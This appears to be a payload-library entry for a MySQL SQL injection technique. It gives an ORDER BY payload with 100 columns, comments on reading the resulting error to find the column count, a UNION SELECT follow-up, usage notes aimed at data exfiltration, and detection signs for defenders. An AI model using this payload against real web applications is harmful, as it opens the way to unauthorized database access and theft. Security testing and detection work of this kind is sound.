---
id: 7a3ab3d9-1067-41e2-8f1a-b63d7daf94f4
name: mysql-order-by-column-detection
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:34.261208+00:00'
updated_at: '2023-04-10T20:22:54.560050+00:00'
platforms:
  - Web
  - MySQL
tags:
  - sql-injection
  - error-based
  - column-detection
validated: true
---

# mysql-order-by-column-detection

## Code

```sql
1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+

# Unknown column '4' in 'order clause'
# This error means query uses 3 column
#-1' UNION SELECT 1,2,3--+    True
```

## Description

This SQL code snippet performs column detection in MySQL via an ORDER BY injection. It sorts by up to 100 columns, using the resulting error to identify the query's column count. The comments explain the error interpretation and a follow-up UNION test.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `$_INJECTION_POINT` | Position to insert the payload (e.g., after = in id=) | id=1' |
| `$_COLUMN_NUMBER` | Adjust the max column number if needed (default 100) | 50 |

## Usage

Inject into a vulnerable web parameter during SQL injection testing. Observe HTTP responses for MySQL errors. Use the detected column count to craft UNION SELECT payloads for data exfiltration. Ideal for error-based SQLi in reconnaissance phases.

## Detection

- Web application logs showing SQL errors with ORDER BY keywords.
- WAF alerts for SQL injection patterns involving ORDER BY clauses.
- Response time anomalies or error pages exposing database details.

## Related

- [[procedures/MySQL-Column-Detection-via-Order-By-or-Group-By]]
- [[codes/mysql-order-by-column-detection]]
